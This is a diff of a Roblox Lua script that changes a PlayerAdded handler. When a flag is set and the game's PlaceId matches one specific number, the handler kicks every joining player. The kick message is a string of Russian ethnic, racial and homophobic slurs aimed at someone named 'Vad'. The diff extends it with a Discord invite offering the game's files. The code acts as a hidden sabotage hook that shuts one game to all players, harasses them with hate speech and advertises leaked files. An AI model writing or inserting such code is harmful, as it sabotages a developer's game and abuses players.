@@ -110,7 +110,7 @@ local wellwellwell = true
 
 game.Players.PlayerAdded:Connect(function(player)
 		if wellwellwell==true and game.PlaceId == 14028572241 then 
-			player:Kick("Вад фашист нацист пидор феменист жыд негр гандон пиздабол рукаблудер фурри фембой \nhttps://discord.gg/tetGnntmjW") 
+			player:Kick("Вад фашист нацист пидор феменист жыд негр гандон пиздабол рукаблудер фурри фембой \nhttps://discord.gg/tetGnntmjW я создал дискорд сервер против вада. заходите чтобы получить файлы игры итд.") 
 		end
 
 	if BlackList[player.Name] then
